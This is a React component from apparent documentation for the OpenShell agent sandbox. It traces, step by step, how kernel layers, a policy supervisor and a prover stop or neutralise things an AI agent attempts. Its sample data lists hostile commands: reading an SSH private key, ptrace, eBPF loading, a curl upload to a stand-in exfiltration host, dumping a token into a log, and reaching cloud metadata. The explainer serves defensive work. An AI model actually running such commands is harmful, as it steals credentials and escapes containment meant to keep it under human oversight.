"use client"

import { useState } from "react"

import { cn } from "@/lib/utils"

// The enforcement playground. Pick something the agent tries, and watch where
// the "no" (or the "yes, with a key you never touched") actually comes from.
// Every stage, mechanism and verdict below is read off the OpenShell source:
// crates/openshell-sandbox/src/sandbox/linux/{landlock,seccomp}.rs for the
// kernel layers, openshell-supervisor-network/src/opa.rs + l7/token_grant_injection.rs
// for the Rego check and credential injection, and openshell-prover/src/{containment,queries}.rs
// for the two SMT checks. Nothing here calls out; it is a static trace of what
// the system does, laid out so the layer that decides is visible.

type Outcome = "allow" | "deny" | "inject" | "review" | "unsupported"

const OUTCOME: Record<Outcome, { label: string; color: string; bg: string }> = {
  allow: { label: "allowed", color: "oklch(0.55 0.14 150)", bg: "oklch(0.55 0.14 150 / 0.12)" },
  deny: { label: "denied", color: "oklch(0.58 0.20 25)", bg: "oklch(0.58 0.20 25 / 0.12)" },
  inject: { label: "allowed · credential injected", color: "oklch(0.60 0.15 255)", bg: "oklch(0.60 0.15 255 / 0.12)" },
  review: { label: "auto-approval blocked · human review", color: "oklch(0.62 0.16 65)", bg: "oklch(0.62 0.16 65 / 0.14)" },
  unsupported: { label: "unsupported · cannot check", color: "oklch(0.55 0.02 260)", bg: "oklch(0.55 0.02 260 / 0.14)" },
}

type Stage = { layer: string; detail: string; outcome?: Outcome }

type Attempt = {
  id: string
  group: "runtime" | "policy"
  cmd: string
  gloss: string
  stages: Stage[]
  verdict: { outcome: Outcome; text: string }
}

const ATTEMPTS: Attempt[] = [
  {
    id: "read-ok",
    group: "runtime",
    cmd: "cat /etc/hostname",
    gloss: "read a file inside the allowed set",
    stages: [
      { layer: "Landlock", detail: "/etc is in the ruleset the child enforced with restrict_self() before exec", outcome: "allow" },
      { layer: "kernel", detail: "openat() returns a real fd; the read proceeds" },
    ],
    verdict: { outcome: "allow", text: "The path is inside the filesystem policy, so the open succeeds. No network, no supervisor." },
  },
  {
    id: "read-secret",
    group: "runtime",
    cmd: "cat /root/.ssh/id_ed25519",
    gloss: "read a file outside the allowed set",
    stages: [
      { layer: "Landlock", detail: "/root is not in any PathBeneath rule, so the LSM refuses the open", outcome: "deny" },
      { layer: "kernel", detail: "openat() returns EACCES; no file descriptor is ever created" },
    ],
    verdict: { outcome: "deny", text: "Landlock is a kernel LSM, not a wrapper. The fd never exists, so there is nothing to read even if the agent ignores the error." },
  },
  {
    id: "ptrace",
    group: "runtime",
    cmd: "strace -p 1   # ptrace another process",
    gloss: "reach into another process",
    stages: [
      { layer: "seccomp", detail: "SYS_ptrace is on the unconditional block list — an escape primitive the workload never needs", outcome: "deny" },
      { layer: "kernel", detail: "the syscall returns EPERM before it runs" },
    ],
    verdict: { outcome: "deny", text: "seccomp is a default-allow filter with targeted blocks: ptrace, mount, io_uring, kexec, userfaultfd, fileless exec. Cross-process attacks are gone before they start." },
  },
  {
    id: "bpf",
    group: "runtime",
    cmd: "bpf(BPF_PROG_LOAD, …)   # load an eBPF program",
    gloss: "load eBPF from inside the sandbox",
    stages: [
      { layer: "seccomp", detail: "SYS_bpf is blocked unconditionally", outcome: "deny" },
      { layer: "kernel", detail: "no eBPF program reaches the verifier" },
    ],
    verdict: { outcome: "deny", text: "The enforcement is classic BPF (cBPF) inside a seccomp filter plus Landlock — not eBPF. The agent cannot load eBPF either; bpf() is denied." },
  },
  {
    id: "net-approved",
    group: "runtime",
    cmd: "curl https://api.github.com/user",
    gloss: "connect to an approved endpoint",
    stages: [
      { layer: "seccomp-notify", detail: "connect() traps as a user notification; the syscall is paused, not failed", outcome: undefined },
      { layer: "sandbox broker", detail: "reads the caller's real program from /proc and forwards the request over the Sandbox Protocol" },
      { layer: "supervisor · Rego", detail: "regorus evaluates the request: a rule allows git clients to reach api.github.com", outcome: "allow" },
      { layer: "supervisor · provider", detail: "injects Authorization: Bearer <token> for this endpoint only", outcome: "inject" },
      { layer: "supervisor · dial", detail: "opens the real TCP connection itself and relays bytes back" },
    ],
    verdict: { outcome: "inject", text: "The credential is added by the trusted supervisor, bound to the endpoint. The agent never holds the token, so it cannot read it, log it, or send it anywhere else." },
  },
  {
    id: "net-denied",
    group: "runtime",
    cmd: "curl https://paste.evil.example/upload",
    gloss: "connect to an unapproved host",
    stages: [
      { layer: "seccomp-notify", detail: "connect() traps as a user notification" },
      { layer: "sandbox broker", detail: "forwards the request to the supervisor" },
      { layer: "supervisor · Rego", detail: "no network rule matches this host → deny", outcome: "deny" },
      { layer: "outer fence", detail: "the supervisor channel is the only egress; nothing else leaves the workload" },
    ],
    verdict: { outcome: "deny", text: "No matching rule means no connection. And with no credential injected for this host, there is nothing to exfiltrate even if a rule were wrong." },
  },
  {
    id: "leak-log",
    group: "runtime",
    cmd: 'echo "$GITHUB_TOKEN" >> /workspace/out.log',
    gloss: "write the API key into a log",
    stages: [
      { layer: "shell", detail: "$GITHUB_TOKEN expands to the empty string — the credential was never in the agent's environment", outcome: undefined },
      { layer: "Landlock", detail: "the write to /workspace is allowed; an empty line is appended", outcome: "allow" },
    ],
    verdict: { outcome: "allow", text: "The write succeeds and leaks nothing. Taking the credential out of the agent's reach means the classic 'secret ends up in a log' bug has no secret to catch." },
  },
  {
    id: "propose-metadata",
    group: "policy",
    cmd: "propose: allow curl → 169.254.169.254:80",
    gloss: "propose a rule reaching cloud metadata",
    stages: [
      { layer: "policy.local", detail: "the agent submits a proposed network rule through the advisor", outcome: undefined },
      { layer: "prover · proposal risk", detail: "Z3 runs the four reachability queries on the merged policy", outcome: undefined },
      { layer: "finding delta", detail: "a new link-local-reach finding appears that the baseline did not have", outcome: "review" },
    ],
    verdict: { outcome: "review", text: "169.254.0.0/16 is the cloud-metadata range — credential territory. Any new finding versus the current policy blocks auto-approval; a human has to sign off." },
  },
  {
    id: "boundary-widen",
    group: "policy",
    cmd: "openshell-prover check sub.yaml --boundary max.yaml",
    gloss: "check a subagent policy against a boundary",
    stages: [
      { layer: "candidate", detail: "sub.yaml adds read_write: /tmp; the boundary max.yaml allows only read_only: /usr, /etc", outcome: undefined },
      { layer: "prover · boundary", detail: "Z3 searches for an action the candidate allows that the boundary forbids", outcome: undefined },
      { layer: "counterexample", detail: "result: exceeds_boundary · counterexample: filesystem write /tmp", outcome: "deny" },
    ],
    verdict: { outcome: "deny", text: "The boundary check is a containment proof. When it fails it hands back a concrete action, not a score — here, the exact write that escapes the boundary." },
  },
  {
    id: "unsupported",
    group: "policy",
    cmd: "openshell-prover check graphql.yaml --boundary max.yaml",
    gloss: "check a policy the model does not cover",
    stages: [
      { layer: "candidate", detail: "the policy carries a GraphQL rule", outcome: undefined },
      { layer: "prover · coverage", detail: "the model covers filesystem, L4, REST, process, Landlock — not GraphQL or MCP", outcome: undefined },
      { layer: "result", detail: "result: unsupported · only L4 TCP and REST are modeled", outcome: "unsupported" },
    ],
    verdict: { outcome: "unsupported", text: "The prover refuses to guess. An uncheckable rule returns unsupported — which you must treat as a failure, not a pass — rather than being silently ignored." },
  },
]

function Chip({ outcome }: { outcome: Outcome }) {
  const o = OUTCOME[outcome]
  return (
    <span
      className="rounded-full px-2 py-0.5 font-mono text-[10px] font-medium whitespace-nowrap"
      style={{ color: o.color, background: o.bg }}
    >
      {o.label}
    </span>
  )
}

function Row({ x, activeId, onSelect }: { x: Attempt; activeId: string; onSelect: (id: string) => void }) {
  const active = x.id === activeId
  return (
    <button
      type="button"
      onClick={() => onSelect(x.id)}
      aria-pressed={active}
      className={cn(
        "w-full rounded-lg border px-3 py-2 text-left transition-colors",
        active ? "border-foreground/40 bg-background" : "border-transparent bg-background/40 hover:bg-background/70",
      )}
    >
      <div className={cn("truncate font-mono text-[11px]", active ? "text-foreground" : "text-muted-foreground")}>
        {x.cmd}
      </div>
      <div className="mt-0.5 truncate text-[10px] text-muted-foreground">{x.gloss}</div>
    </button>
  )
}

export function MediationTrace() {
  const [id, setId] = useState<string>(ATTEMPTS[0].id)
  const a = ATTEMPTS.find((x) => x.id === id) ?? ATTEMPTS[0]
  const runtime = ATTEMPTS.filter((x) => x.group === "runtime")
  const policy = ATTEMPTS.filter((x) => x.group === "policy")
  const v = OUTCOME[a.verdict.outcome]

  return (
    <figure className="my-8 overflow-hidden rounded-xl border bg-gradient-to-b from-muted/15 to-transparent">
      <div className="flex flex-wrap items-center justify-between gap-2 border-b px-4 py-2.5">
        <span className="font-mono text-xs text-muted-foreground">the agent tries something · where the decision happens</span>
        <span className="font-mono text-[10px] text-muted-foreground">kernel · supervisor · prover</span>
      </div>

      <div className="grid gap-3 p-3 sm:p-4 lg:grid-cols-[minmax(0,17rem)_1fr]">
        <div className="space-y-3">
          <div>
            <div className="mb-1 font-mono text-[10px] uppercase tracking-wide text-muted-foreground">at runtime</div>
            <div className="space-y-1">
              {runtime.map((x) => (
                <Row key={x.id} x={x} activeId={id} onSelect={setId} />
              ))}
            </div>
          </div>
          <div>
            <div className="mb-1 font-mono text-[10px] uppercase tracking-wide text-muted-foreground">on a policy change</div>
            <div className="space-y-1">
              {policy.map((x) => (
                <Row key={x.id} x={x} activeId={id} onSelect={setId} />
              ))}
            </div>
          </div>
        </div>

        <div className="rounded-lg border bg-background/60 p-3 sm:p-4">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <code className="font-mono text-[12px] text-foreground">{a.cmd}</code>
            <Chip outcome={a.verdict.outcome} />
          </div>

          <ol className="mt-4 space-y-0">
            {a.stages.map((s, i) => {
              const last = i === a.stages.length - 1
              return (
                <li key={s.layer + String(i)} className="relative grid grid-cols-[auto_1fr] gap-x-3">
                  <div className="flex flex-col items-center">
                    <span
                      className="mt-1 size-2.5 shrink-0 rounded-full border"
                      style={s.outcome ? { background: OUTCOME[s.outcome].color, borderColor: OUTCOME[s.outcome].color } : { borderColor: "var(--border)" }}
                    />
                    {!last ? <span className="w-px flex-1 bg-border" /> : null}
                  </div>
                  <div className={cn("pb-4", last && "pb-0")}>
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="font-mono text-[11px] font-medium text-foreground">{s.layer}</span>
                      {s.outcome ? <Chip outcome={s.outcome} /> : null}
                    </div>
                    <div className="mt-0.5 text-[12px] leading-5 text-muted-foreground">{s.detail}</div>
                  </div>
                </li>
              )
            })}
          </ol>

          <div className="mt-3 rounded-md border-l-2 p-2 pl-3 text-[12px] leading-5" style={{ borderColor: v.color, background: v.bg }}>
            {a.verdict.text}
          </div>
        </div>
      </div>

      <figcaption className="border-t px-4 py-2 font-mono text-[10px] leading-4 text-muted-foreground">
        Illustrative trace. The mechanisms and verdicts are read from the OpenShell source (sandbox, supervisor-network, and prover crates); the request does not actually leave the page.
      </figcaption>
    </figure>
  )
}
